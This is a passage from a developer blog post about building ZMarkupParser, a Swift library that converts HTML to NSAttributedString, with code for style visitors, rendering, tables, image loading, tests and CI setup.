HTMLTagStyleAttributeToMarkupStyleVisitor: HTMLTagStyleAttributeVisitor { typealias Result = MarkupStyle? let value: String func visit(_ styleAttribute: ColorHTMLTagStyleAttribute) -&gt; Result { // Regex extract Color Hex or Mapping from HTML Pre-defined Color Name, see Source Code guard let color = MarkupStyleColor(string: value) else { return nil } return MarkupStyle(foregroundColor: color) } func visit(_ styleAttribute: FontSizeHTMLTagStyleAttribute) -&gt; Result { // Regex extract 10px -&gt; 10, see Source Code guard let size = self.convert(fromPX: value) else { return nil } return MarkupStyle(font: MarkupStyleFont(size: CGFloat(size))) } // ...} Implementation corresponding to the source code in HTMLTagAttributeToMarkupStyleVisitor.swiftThe value of init is set to the attribute‚Äôs value, converted to the corresponding MarkupStyle field based on the visit type.HTMLElementMarkupComponentMarkupStyleVisitorAfter introducing the MarkupStyle object, we will convert the Normalization‚Äôs HTMLElementComponents result into MarkupStyle.// MarkupStyle Policypublic enum MarkupStylePolicy { case respectMarkupStyleFromCode // Prioritize code-based styles, fill in with HTML Style Attribute case respectMarkupStyleFromHTMLStyleAttribute // Prioritize HTML Style Attribute, fill in with code-based styles}struct HTMLElementMarkupComponentMarkupStyleVisitor: MarkupVisitor { typealias Result = MarkupStyle? let policy: MarkupStylePolicy let components: [HTMLElementMarkupComponent] let styleAttributes: [HTMLTagStyleAttribute] func visit(_ markup: BoldMarkup) -&gt; Result { // .bold is just the default style defined in MarkupStyle, please refer to Source Code return defaultVisit(components.value(markup: markup), defaultStyle: .bold) } func visit(_ markup: LinkMarkup) -&gt; Result { // .link is just the default style defined in MarkupStyle, please refer to Source Code var markupStyle = defaultVisit(components.value(markup: markup), defaultStyle: .link) ?? .link // Get the HtmlElement corresponding to LinkMarkup from HtmlElementComponents // Find href parameter in HtmlElement's attributes (HTML URL string) if let href = components.value(markup: markup)?.attributes?[\"href\"] as? String, let url = URL(string: href) { markupStyle.link = url } return markupStyle } // ...}extension HTMLElementMarkupComponentMarkupStyleVisitor { // Get the customized MarkupStyle specified in the HTMLTag container private func customStyle(_ htmlElement: HTMLElementMarkupComponent.HTMLElement?) -&gt; MarkupStyle? { guard let customStyle = htmlElement?.tag.customStyle else { return nil } return customStyle } // Default action func defaultVisit(_ htmlElement: HTMLElementMarkupComponent.HTMLElement?, defaultStyle: MarkupStyle? = nil) -&gt; Result { var markupStyle: MarkupStyle? = customStyle(htmlElement) ?? defaultStyle // Get the HtmlElement corresponding to LinkMarkup from HtmlElementComponents // Check if HtmlElement's attributes contain a `style` attribute guard let styleString = htmlElement?.attributes?[\"style\"], styleAttributes.count &gt; 0 else { // None found return markupStyle } // Has Style Attributes // Split Style Value string into array // font-size:14px;color:red -&gt; [\"font-size\":\"14px\",\"color\":\"red\"] let styles = styleString.split(separator: \";\").filter { $0.trimmingCharacters(in: .whitespacesAndNewlines) != \"\" }.map { $0.split(separator: \":\") } for style in styles { guard style.count == 2 else { continue } // e.g. font-size let key = style[0].trimmingCharacters(in: .whitespacesAndNewlines) // e.g. 14px let value = style[1].trimmingCharacters(in: .whitespacesAndNewlines) if let styleAttribute = styleAttributes.first(where: { $0.isEqualTo(styleName: key) }) { // Use the HTMLTagStyleAttributeToMarkupStyleVisitor above to convert back to MarkupStyle let visitor = HTMLTagStyleAttributeToMarkupStyleVisitor(value: value) if var thisMarkupStyle = visitor.visit(styleAttribute: styleAttribute) { // When Style Attribute has a converted value... // Merge with previous MarkupStyle result thisMarkupStyle.fillIfNil(from: markupStyle) markupStyle = thisMarkupStyle } } } // If there is a default Style if var defaultStyle = defaultStyle { switch policy { case .respectMarkupStyleFromHTMLStyleAttribute: // Style Attribute MarkupStyle takes priority, // then merge defaultStyle result markupStyle?.fillIfNil(from: defaultStyle) case .respectMarkupStyleFromCode: // defaultStyle takes priority, // then merge Style Attribute MarkupStyle result defaultStyle.fillIfNil(from: markupStyle) markupStyle = defaultStyle } } return markupStyle }} Implementation corresponding to the source code in HTMLTagAttributeToMarkupStyleVisitor.swiftWe define some default styles in MarkupStyle. If a Markup does not have a style specified from outside the Code for its Tag, the default style will be used.There are two style inheritance strategies: respectMarkupStyleFromCode:Use the default style as the base; then check the Style Attributes to see what styles can be added. If a value already exists, ignore it. respectMarkupStyleFromHTMLStyleAttribute:Prioritize Style Attributes; then check the default styles to see what can be added. Ignore if the value already exists. HTMLElementWithMarkupToMarkupStyleProcessorConvert the normalization results into AST &amp; MarkupStyleComponent.Declare a new MarkupComponent to store the corresponding MarkupStyle this time:struct MarkupStyleComponent: MarkupComponent { typealias T = MarkupStyle let markup: Markup let value: MarkupStyle init(markup: Markup, value: MarkupStyle) { self.markup = markup self.value = value }}Simple traversal of a Markup Tree &amp; HTMLElementMarkupComponent structure:let styleAttributes: [HTMLTagStyleAttribute]let policy: MarkupStylePolicy func process(from: (Markup, [HTMLElementMarkupComponent])) -&gt; [MarkupStyleComponent] { var components: [MarkupStyleComponent] = [] let visitor = HTMLElementMarkupComponentMarkupStyleVisitor(policy: policy, components: from.1, styleAttributes: styleAttributes) walk(markup: from.0, visitor: visitor, components: &amp;components) return components} func walk(markup: Markup, visitor: HTMLElementMarkupComponentMarkupStyleVisitor, components: inout [MarkupStyleComponent]) { if let markupStyle = visitor.visit(markup: markup) { components.append(.init(markup: markup, value: markupStyle)) } for markup in markup.childMarkups { walk(markup: markup, visitor: visitor, components: &amp;components) }}// print(components)// [(markup: LinkMarkup, MarkupStyle(link: https://zhgchg.li, color: .blue)]// [(markup: BoldMarkup, MarkupStyle(font: .init(weight: .bold))] Implementation corresponding to the source code in HTMLElementWithMarkupToMarkupStyleProcessor.swiftThe process result is shown in the above image.Render ‚Äî Convert To NSAttributedStringNow that we have the HTML Tag abstract tree structure and the corresponding MarkupStyle for each HTML Tag, the final step is to generate the final NSAttributedString rendering result.MarkupNSAttributedStringVisitorTo convert HTML markup to NSAttributedString in iOS, you can use the following Swift code snippet:import UIKitlet htmlString = \"&lt;p&gt;This is &lt;strong&gt;bold&lt;/strong&gt; and &lt;em&gt;italic&lt;/em&gt; text.&lt;/p&gt;\"if let data = htmlString.data(using: .utf8) { do { let attributedString = try NSAttributedString( data: data, options: [.documentType: NSAttributedString.DocumentType.html, .characterEncoding: String.Encoding.utf8.rawValue], documentAttributes: nil) // Use attributedString as needed } catch { print(\"Error creating attributed string: \\(error)\") }}struct MarkupNSAttributedStringVisitor: MarkupVisitor { typealias Result = NSAttributedString let components: [MarkupStyleComponent] // root / base MarkupStyle, specified externally, e.g., can set the font size for the entire string let rootStyle: MarkupStyle? func visit(_ markup: RootMarkup) -&gt; Result { // Look down to RawString objects return collectAttributedString(markup) } func visit(_ markup: RawStringMarkup) -&gt; Result { // Return Raw String // Collect all MarkupStyles in the chain // Apply Style to NSAttributedString return applyMarkupStyle(markup.attributedString, with: collectMarkupStyle(markup)) } func visit(_ markup: BoldMarkup) -&gt; Result { // Look down to RawString objects return collectAttributedString(markup) } func visit(_ markup: LinkMarkup) -&gt; Result { // Look down to RawString objects return collectAttributedString(markup) } // ...}private extension MarkupNSAttributedStringVisitor { // Apply Style to NSAttributedString func applyMarkupStyle(_ attributedString: NSAttributedString, with markupStyle: MarkupStyle?) -&gt; NSAttributedString { guard let markupStyle = markupStyle else { return attributedString } let mutableAttributedString = NSMutableAttributedString(attributedString: attributedString) mutableAttributedString.addAttributes(markupStyle.render(), range: NSMakeRange(0, mutableAttributedString.string.utf16.count)) return mutableAttributedString } func collectAttributedString(_ markup: Markup) -&gt; NSMutableAttributedString { // collect from downstream // Root -&gt; Bold -&gt; String(\"Bold\") // \\ // &gt; String(\"Test\") // Result: Bold Test // Recursively look down layer by layer for raw strings, visit and combine into final NSAttributedString return markup.childMarkups.compactMap({ visit(markup: $0) }).reduce(NSMutableAttributedString()) { partialResult, attributedString in partialResult.append(attributedString) return partialResult } } func collectMarkupStyle(_ markup: Markup) -&gt; MarkupStyle? { // collect from upstream // String(\"Test\") -&gt; Bold -&gt; Italic -&gt; Root // Result: style: Bold+Italic // Look up layer by layer for parent tag's markup style // Then inherit styles layer by layer var currentMarkup: Markup? = markup.parentMarkup var currentStyle = components.value(markup: markup) while let thisMarkup = currentMarkup { guard let thisMarkupStyle = components.value(markup: thisMarkup) else { currentMarkup = thisMarkup.parentMarkup continue } if var thisCurrentStyle = currentStyle { thisCurrentStyle.fillIfNil(from: thisMarkupStyle) currentStyle = thisCurrentStyle } else { currentStyle = thisMarkupStyle } currentMarkup = thisMarkup.parentMarkup } if var currentStyle = currentStyle { currentStyle.fillIfNil(from: rootStyle) return currentStyle } else { return rootStyle } }} Implementation corresponding to the source code in MarkupNSAttributedStringVisitor.swiftThe operation process and results are shown in the above image.In the end, we can get:Li{ NSColor = \"Blue\"; NSFont = \"&lt;UICTFont: 0x145d17600&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 13.00pt\"; NSLink = \"https://zhgchg.li\";}nk{ NSColor = \"Blue\"; NSFont = \"&lt;UICTFont: 0x145d18710&gt; font-family: \\\".SFUI-Semibold\\\"; font-weight: bold; font-style: normal; font-size: 13.00pt\"; NSLink = \"https://zhgchg.li\";}Bold{ NSFont = \"&lt;UICTFont: 0x145d18710&gt; font-family: \\\".SFUI-Semibold\\\"; font-weight: bold; font-style: normal; font-size: 13.00pt\";} üéâüéâüéâüéâCompletedüéâüéâüéâüéâAt this point, we have completed the entire process of converting an HTML String to NSAttributedString.Stripper ‚Äî Remove HTML TagsRemoving HTML tags is relatively simple and only requires:func attributedString(_ markup: Markup) -&gt; NSAttributedString { if let rawStringMarkup = markup as? RawStringMarkup { return rawStringMarkup.attributedString } else { return markup.childMarkups.compactMap({ attributedString($0) }).reduce(NSMutableAttributedString()) { partialResult, attributedString in partialResult.append(attributedString) return partialResult } }} Corresponding to the implementation in the source code MarkupStripperProcessor.swiftSimilar to Render, but simply finds RawStringMarkup and returns the content.Extend ‚Äî Dynamic ExpansionTo cover all HTML Tags and Style Attributes, a dynamic extension point was created to allow direct dynamic extension of objects from the code.public struct ExtendTagName: HTMLTagName { public let string: String public init(_ w3cHTMLTagName: WC3HTMLTagName) { self.string = w3cHTMLTagName.rawValue } public init(_ string: String) { self.string = string.trimmingCharacters(in: .whitespacesAndNewlines).lowercased() } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }}// tofinal class ExtendMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}//----public struct ExtendHTMLTagStyleAttribute: HTMLTagStyleAttribute { public let styleName: String public let render: ((String) -&gt; (MarkupStyle?)) // Dynamically change MarkupStyle using closure public init(styleName: String, render: @escaping ((String) -&gt; (MarkupStyle?))) { self.styleName = styleName self.render = render } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagStyleAttributeVisitor { return visitor.visit(self) }}ZHTMLParserBuilderFinally, we use the Builder Pattern to allow external modules to quickly construct the objects required by ZMarkupParser, while implementing proper access level control.public final class ZHTMLParserBuilder { private(set) var htmlTags: [HTMLTag] = [] private(set) var styleAttributes: [HTMLTagStyleAttribute] = [] private(set) var rootStyle: MarkupStyle? private(set) var policy: MarkupStylePolicy = .respectMarkupStyleFromCode public init() { } public static func initWithDefault() -&gt; Self { var builder = Self.init() for htmlTagName in ZHTMLParserBuilder.htmlTagNames { builder = builder.add(htmlTagName) } for styleAttribute in ZHTMLParserBuilder.styleAttributes { builder = builder.add(styleAttribute) } return builder } public func set(_ htmlTagName: HTMLTagName, withCustomStyle markupStyle: MarkupStyle?) -&gt; Self { return self.add(htmlTagName, withCustomStyle: markupStyle) } public func add(_ htmlTagName: HTMLTagName, withCustomStyle markupStyle: MarkupStyle? = nil) -&gt; Self { // Only one tagName can exist htmlTags.removeAll { htmlTag in return htmlTag.tagName.string == htmlTagName.string } htmlTags.append(HTMLTag(tagName: htmlTagName, customStyle: markupStyle)) return self } public func add(_ styleAttribute: HTMLTagStyleAttribute) -&gt; Self { styleAttributes.removeAll { thisStyleAttribute in return thisStyleAttribute.styleName == styleAttribute.styleName } styleAttributes.append(styleAttribute) return self } public func set(rootStyle: MarkupStyle) -&gt; Self { self.rootStyle = rootStyle return self } public func set(policy: MarkupStylePolicy) -&gt; Self { self.policy = policy return self } public func build() -&gt; ZHTMLParser { // ZHTMLParser init is internal only, cannot be directly initialized externally // Can only be initialized via ZHTMLParserBuilder return ZHTMLParser(htmlTags: htmlTags, styleAttributes: styleAttributes, policy: policy, rootStyle: rootStyle) }} Corresponding implementation in the source code ZHTMLParserBuilder.swiftinitWithDefault will include all implemented HTMLTagName/Style Attributes by defaultpublic extension ZHTMLParserBuilder { static var htmlTagNames: [HTMLTagName] { return [ A_HTMLTagName(), B_HTMLTagName(), BR_HTMLTagName(), DIV_HTMLTagName(), HR_HTMLTagName(), I_HTMLTagName(), LI_HTMLTagName(), OL_HTMLTagName(), P_HTMLTagName(), SPAN_HTMLTagName(), STRONG_HTMLTagName(), U_HTMLTagName(), UL_HTMLTagName(), DEL_HTMLTagName(), TR_HTMLTagName(), TD_HTMLTagName(), TH_HTMLTagName(), TABLE_HTMLTagName(), IMG_HTMLTagName(handler: nil), // ... ] }}public extension ZHTMLParserBuilder { static var styleAttributes: [HTMLTagStyleAttribute] { return [ ColorHTMLTagStyleAttribute(), BackgroundColorHTMLTagStyleAttribute(), FontSizeHTMLTagStyleAttribute(), FontWeightHTMLTagStyleAttribute(), LineHeightHTMLTagStyleAttribute(), WordSpacingHTMLTagStyleAttribute(), // ... ] }}ZHTMLParser init is only internal, so it cannot be directly initialized externally. It can only be initialized through ZHTMLParserBuilder.ZHTMLParser encapsulates Render/Selector/Stripper operations:public final class ZHTMLParser: ZMarkupParser { let htmlTags: [HTMLTag] let styleAttributes: [HTMLTagStyleAttribute] let rootStyle: MarkupStyle? internal init(...) { } // Get link style attributes public var linkTextAttributes: [NSAttributedString.Key: Any] { // ... } public func selector(_ string: String) -&gt; HTMLSelector { // ... } public func selector(_ attributedString: NSAttributedString) -&gt; HTMLSelector { // ... } public func render(_ string: String) -&gt; NSAttributedString { // ... } // Allow rendering NSAttributedString inside nodes using HTMLSelector results public func render(_ selector: HTMLSelector) -&gt; NSAttributedString { // ... } public func render(_ attributedString: NSAttributedString) -&gt; NSAttributedString { // ... } public func stripper(_ string: String) -&gt; String { // ... } public func stripper(_ attributedString: NSAttributedString) -&gt; NSAttributedString { // ... } // ...} Implementation corresponding to the source code in ZHTMLParser.swiftUIKit IssuesThe most common use of NSAttributedString is to display it in a UITextView, but be aware: The link style in UITextView is uniformly determined by the linkTextAttributes setting and does not consider the NSAttributedString.Key settings. Individual link styles cannot be set; this is why ZMarkupParser.linkTextAttributes exists as an interface. UILabel currently does not support changing link styles, and since UILabel lacks TextStorage, loading NSTextAttachment images requires additional handling of UILabel. public extension UITextView { func setHtmlString(_ string: String, with parser: ZHTMLParser) { self.setHtmlString(NSAttributedString(string: string), with: parser) } func setHtmlString(_ string: NSAttributedString, with parser: ZHTMLParser) { self.attributedText = parser.render(string) self.linkTextAttributes = parser.linkTextAttributes }}public extension UILabel { func setHtmlString(_ string: String, with parser: ZHTMLParser) { self.setHtmlString(NSAttributedString(string: string), with: parser) } func setHtmlString(_ string: NSAttributedString, with parser: ZHTMLParser) { let attributedString = parser.render(string) attributedString.enumerateAttribute(NSAttributedString.Key.attachment, in: NSMakeRange(0, attributedString.string.utf16.count), options: []) { (value, effectiveRange, nil) in guard let attachment = value as? ZNSTextAttachment else { return } attachment.register(self) } self.attributedText = attributedString }}Therefore, by extending UIKit, external code only needs to simply call setHTMLString() to complete the binding.Complex Rendering Items ‚Äî Item ListRecord of the implementation of the project list.Using &lt;ol&gt; / &lt;ul&gt; to wrap &lt;li&gt; in HTML indicates a list of items:&lt;ul&gt; &lt;li&gt;ItemA&lt;/li&gt; &lt;li&gt;ItemB&lt;/li&gt; &lt;li&gt;ItemC&lt;/li&gt; //...&lt;/ul&gt;Using the same parsing method as before, we can obtain other list items and know the current list index in visit(_ markup: ListItemMarkup) (thanks to the conversion to AST).func visit(_ markup: ListItemMarkup) -&gt; Result { let siblingListItems = markup.parentMarkup?.childMarkups.filter({ $0 is ListItemMarkup }) ?? [] let position = (siblingListItems.firstIndex(where: { $0 === markup }) ?? 0)}NSParagraphStyle has an NSTextList object that can be used to display list items, but it does not allow customization of the space width (I personally find the space too wide). If there is a space between the bullet and the string, line breaks will occur there, causing the display to look a bit odd, as shown below:The Beter part might be achievable through setting headIndent, firstLineHeadIndent, NSTextTab, but tests showed that with long strings or size changes, the result still cannot be perfectly displayed.Currently only achieves Acceptable by inserting the combined item list string at the beginning of the string.We only use NSTextList.MarkerFormat for list item symbols, not NSTextList directly.The supported list symbols can be found here: MarkupStyleList.swiftFinal display result: ( &lt;ol&gt;&lt;li&gt; )Complex Rendering Items ‚Äî TableSimilar to implementing list items, but in a table.Using &lt;table&gt; in HTML to create tables -&gt; wrapping &lt;tr&gt; for table rows -&gt; wrapping &lt;td&gt;/&lt;th&gt; to represent table cells:&lt;table&gt; &lt;tr&gt; &lt;th&gt;Company&lt;/th&gt; &lt;th&gt;Contact&lt;/th&gt; &lt;th&gt;Country&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Alfreds Futterkiste&lt;/td&gt; &lt;td&gt;Maria Anders&lt;/td&gt; &lt;td&gt;Germany&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Centro comercial Moctezuma&lt;/td&gt; &lt;td&gt;Francisco Chang&lt;/td&gt; &lt;td&gt;Mexico&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;Testing shows that the native NSAttributedString.DocumentType.html uses the private macOS API NSTextBlock for rendering, allowing full display of HTML table styles and content. A bit of cheating! We can‚Äôt use Private API ü•≤ func visit(_ markup: TableColumnMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) let siblingColumns = markup.parentMarkup?.childMarkups.filter({ $0 is TableColumnMarkup }) ?? [] let position = (siblingColumns.firstIndex(where: { $0 === markup }) ?? 0) // Whether a desired width is specified externally, can set .max to avoid truncated string var maxLength: Int? = markup.fixedMaxLength if maxLength == nil { // If not specified, find the string length of the first row in the same column as max length if let tableRowMarkup = markup.parentMarkup as? TableRowMarkup, let firstTableRow = tableRowMarkup.parentMarkup?.childMarkups.first(where: { $0 is TableRowMarkup }) as? TableRowMarkup { let firstTableRowColumns = firstTableRow.childMarkups.filter({ $0 is TableColumnMarkup }) if firstTableRowColumns.indices.contains(position) { let firstTableRowColumnAttributedString = collectAttributedString(firstTableRowColumns[position]) let length = firstTableRowColumnAttributedString.string.utf16.count maxLength = length } } } if let maxLength = maxLength { // If the field exceeds maxLength, truncate the string if attributedString.string.utf16.count &gt; maxLength { attributedString.mutableString.setString(String(attributedString.string.prefix(maxLength))+\"...\") } else { attributedString.mutableString.setString(attributedString.string.padding(toLength: maxLength, withPad: \" \", startingAt: 0)) } } if position &lt; siblingColumns.count - 1 { // Add spaces as spacing; external can specify how many spaces for spacing width attributedString.append(makeString(in: markup, string: String(repeating: \" \", count: markup.spacing))) } return attributedString } func visit(_ markup: TableRowMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) attributedString.append(makeBreakLine(in: markup)) // Add newline, see Source Code for details return attributedString } func visit(_ markup: TableMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) attributedString.append(makeBreakLine(in: markup)) // Add newline, see Source Code for details attributedString.insert(makeBreakLine(in: markup), at: 0) // Add newline, see Source Code for details return attributedString }The final display effect is as shown in the picture below:not perfect, but acceptable.Complex Rendering Item ‚Äî ImageFinally, let‚Äôs discuss the biggest challenge: loading remote images into NSAttributedString.Using &lt;img&gt; to represent images in HTML:&lt;img src=\"https://user-images.githubusercontent.com/33706588/219608966-20e0c017-d05c-433a-9a52-091bc0cfd403.jpg\" width=\"300\" height=\"125\"/&gt;You can specify the desired display size using the width / height HTML attributes.Displaying images in NSAttributedString is much more complicated than expected; there is no good implementation. I encountered some issues before when working on UITextView Text Wrapping, but after researching again, I found there is still no perfect solution.Currently, ignore the native issue that NSTextAttachment cannot reuse and release memory. First, implement downloading images from a remote source to NSTextAttachment, then insert it into NSAttributedString, and achieve automatic content updating.This series of operations is further divided into a smaller project for implementation, aiming for easier optimization and reuse in other projects in the future:Mainly based on Asynchronous NSTextAttachments series, but replaced the final update part (UI refresh needed after download to display) and added Delegate/DataSource for external extension.The operation process and relationships are shown in the above diagram. Declare a ZNSTextAttachmentable object that encapsulates an NSTextStorage object (built-in UITextView) and the UILabel itself (UILabel has no NSTextStorage).The operation method is only to implement replacing attributedString from NSRange. (func replace(attachment: ZNSTextAttachment, to: ZResizableNSTextAttachment)) The implementation principle is to first use ZNSTextAttachment to wrap the imageURL, PlaceholderImage, and prominent display size information, then directly display the image using the placeholder. When the system needs this image on the screen, it calls the image(forBounds‚Ä¶) method, and at this point, we start downloading the Image Data. DataSource allows external control over how to download or implement Image Cache Policy. By default, it uses URLSession to request image data directly. After downloading, create a new ZResizableNSTextAttachment and implement the custom image size logic in attachmentBounds(for‚Ä¶) Call the replace(attachment: ZNSTextAttachment, to: ZResizableNSTextAttachment) method to replace the position of ZNSTextAttachment with ZResizableNSTextAttachment Send didLoad Delegate notification for external integration when needed Completed For detailed code, please refer to Source Code .The reason for not using NSLayoutManager.invalidateLayout(forCharacterRange: range, actualCharacterRange: nil) or NSLayoutManager.invalidateDisplay(forCharacterRange: range) to refresh the UI is that the UI does not update correctly. Since the range is already known, directly triggering a replacement of the NSAttributedString ensures the UI updates properly.The final display result is as follows:&lt;span style=\"color:red\"&gt;Hello&lt;/span&gt;Hello hello &lt;br /&gt;&lt;img src=\"https://user-images.githubusercontent.com/33706588/219608966-20e0c017-d05c-433a-9a52-091bc0cfd403.jpg\"/&gt;Testing &amp; Continuous IntegrationIn this project, besides writing Unit Tests, Snapshot Tests were also created for integration testing to facilitate comprehensive testing and comparison of the final NSAttributedString.The main functional logic has UnitTests and integration tests, with the final Test Coverage around 85%.ZMarkupParser ‚Äî codecovSnapshot TestDirectly Importing the Framework:import SnapshotTesting// ...func testShouldKeepNSAttributedString() { let parser = ZHTMLParserBuilder.initWithDefault().build() let textView = UITextView() textView.frame.size.width = 390 textView.isScrollEnabled = false textView.backgroundColor = .white textView.setHtmlString(\"html string...\", with: parser) textView.layoutIfNeeded() assertSnapshot(matching: textView, as: .image, record: false)}// ...Directly compare the final results to ensure the adjustments and integration have no issues.Codecov Test CoverageIntegrate with Codecov.io (free for Public Repos) to assess Test Coverage by simply installing the Codecov GitHub App and configuring it.After setting up Codecov &lt;-&gt; Github Repo, you can also add a codecov.yml file in the project‚Äôs root directory.comment: # this is a top-level key layout: \"reach, diff, flags, files\" behavior: default require_changes: false # if true: only post the comment if coverage changes require_base: no # [yes :: must have a base report to post] require_head: yes # [yes :: must have a head report to post]Configuration file, this enables automatic commenting of the CI results on each PR after it is issued.Continuous IntegrationGithub Action, CI Integration: ci.ymlname: CIon: workflow_dispatch: pull_request: types: [opened, reopened] push: branches: - mainjobs: build: runs-on: self-hosted steps: - uses: actions/checkout@v3 - name: spm build and test run: \\| set -o pipefail xcodebuild test -workspace ZMarkupParser.xcworkspace -testPlan ZMarkupParser -scheme ZMarkupParser -enableCodeCoverage YES -resultBundlePath './scripts/TestResult.xcresult' -destination 'platform=iOS Simulator,name=iPhone 14,OS=16.1' build test \\| xcpretty - name: Codecov uses: codecov/codecov-action@v3.1.1 with: xcode: true xcode_archive_path: './scripts/TestResult.xcresult'This setting runs build and test when a PR is opened/reopened or code is pushed to the main branch, and finally uploads the test coverage report to codecov.RegexRegarding regular expressions, each time I use them, I improve further; this time I didn‚Äôt use them much, but since I initially wanted to use a regex to extract paired HTML tags, I studied how to write them more carefully.Some cheat sheet notes I learned this time‚Ä¶ ?: allows the ( ) to group the match but does not capture the resulte.g. (?:https?:\\/\\/)?(?:www\\.)?example\\.com will return the entire URL in https://www.example.com instead of https:// and www .+? Non-greedy match (returns the nearest match)e.g. &lt;.+?&gt; in &lt;a&gt;test&lt;/a&gt; returns &lt;a&gt; and &lt;/a&gt; instead of the entire string (?=XYZ) any string until the substring XYZ appears; note that a similar pattern [^XYZ] means any character until X or Y or Z appears.e.g. (?:__)(.+?(?=__))(?:__) (any string until __) will match test ?R recursively searches inward for the same patterne.g. \\((?:[^()]\\|((?R)))+\\) applied to (simple) (and(nested)) will match (simple), (and(nested)), and (nested) ?&lt;GroupName&gt; ‚Ä¶ \\k&lt;GroupName&gt; matches the previous Group Namee.g. (?&lt;tagName&gt;&lt;a&gt;).*(\\k&lt;GroupName&gt;) (?(X)yes\\|no) matches yes if the Xth capture group (or Group Name) has a value, otherwise matches noNot supported in Swift for now Other Great Regex Articles: Swift Regex Quick Reference How Do Regular Expressions Work? -&gt; Can be referenced for optimizing regex performance in this project later Regex error causing infinite search, ultimately leading to server failure case Regex101 can be used to look up all regex rules in the bottom right corner Swift Package Manager &amp; CocoapodsThis is also my first time developing with SPM &amp; Cocoapods‚Ä¶ quite interesting. SPM is really convenient; however, if two projects depend on the same package, opening both projects simultaneously may cause one of them to fail to find the package and not build properly.Cocoapods has uploaded ZMarkupParser but hasn‚Äôt tested if it works properly, since I use SPM üòù.ChatGPTBased on actual development experience, I find it most useful only when helping to polish the Readme; during development, I haven‚Äôt felt any significant benefit. Asking mid-senior level questions often results in unclear or even incorrect answers (for example, I asked about some regex rules and the answers were not quite accurate), so in the end, I still rely on Google to manually find the correct solutions.Not to mention asking it to write code, unless it‚Äôs a simple Code Gen Object; otherwise, don‚Äôt expect it to complete the entire tool architecture directly. (At least for now, it seems Copilot might be more helpful for coding tasks)But it can provide general guidance on knowledge gaps, allowing us to quickly get a rough idea of how certain things should be done. Sometimes, when our grasp is too weak, it‚Äôs hard to quickly find the right direction on Google. In such cases, ChatGPT is quite helpful.DisclaimerAfter more than three months of research and development, I am exhausted, but I want to clarify that this approach is only a feasible result from my study. It may not be the best solution and could still be optimized. This project is more like a starting point, hoping to find a perfect solution for Markup Language to NSAttributedString. Contributions are highly welcome; many aspects still require collective effort to improve.ContributingZMarkupParser ‚≠êHere are some improvements that come to mind at this moment (2023/03/12). They will be recorded in the Repo later: Performance/algorithm optimization, although faster and more stable than the native NSAttributedString.DocumentType.html, still has much room for improvement. I believe its performance is definitely not as good as XMLParser. Hopefully, one day it can achieve the same performance while maintaining customization and automatic error correction. Support for more HTML Tags and Style Attribute conversion and parsing ZNSTextAttachment further optimized to enable reuse and release memory; may need to study CoreText Supports Markdown parsing. Since the underlying abstraction is not limited to HTML, as long as the Markdown-to-Markup object is properly built, Markdown parsing can be completed. Therefore, I named it ZMarkupParser instead of ZHTMLParser, hoping that one day it can also support Markdown to NSAttributedString. Supports Any to Any, e.g. HTML To Markdown, Markdown To HTML. Since we have the original AST tree (Markup object), it is possible to implement conversion between any Markup formats. Implementing CSS !important Functionality to Enhance the Inheritance Strategy of Abstract MarkupStyle Enhance the HTML Selector feature, which currently only has the most basic filter functionality. So many, feel free to open an issue If you want to support but lack the time, you can give me a ‚≠ê so this Repo can be seen by more people, increasing the chance for Github experts to contribute!SummaryZMarkupParserThat sums up all the technical details and my journey developing ZMarkupParser. It took me almost three months of after-work and weekend time, countless research and practice sessions, writing tests, improving test coverage, and setting up CI. Only then did I have a somewhat presentable result. I hope this tool helps those facing similar challenges, and I also hope everyone can work together to make this tool even better.pinkoi.comCurrently applied in our company‚Äôs iOS app pinkoi.com, no issues found. üòÑFurther Reading ZMarkupParser HTML String to NSAttributedString Tool String Rendering Asynchronous NSTextAttachments If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "ZMarkupParserÔΩúConvert HTML String to NSAttributedString with Custom Style Keys", "url": "/posts/zrealm-dev/zmarkupparser-convert-html-string-to-nsattributedstring-with-custom-style-keys-a5643de271e4/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, html-parser, nsattributedstring, ios-app-development, html, markdown", "date": "2023-02-26 17:03:07 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!ZMarkupParser HTML String to NSAttributedString Converter ToolConvert HTML Str...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!ZMarkupParser HTML String to NSAttributedString Converter ToolConvert HTML String to NSAttributedString with Corresponding Key Style SettingsZhgChgLi / ZMarkupParserZhgChgLi / ZMarkupParserFeatures Developed purely in Swift, it uses Regex to parse HTML tags and tokenize them. It analyzes and corrects tag accuracy (fixing tags without an end and misaligned tags), then converts them into an abstract syntax tree. Finally, it uses the Visitor Pattern to map HTML tags to abstract styles, producing the final NSAttributedString result. No parser libraries are used. Supports HTML Render (to NSAttributedString) / Stripper (removes HTML tags) / Selector functions Automatic Analysis and Correction of Tag Accuracy (Fix Missing End Tags &amp; Misplaced Tags)&lt;br&gt; -&gt; 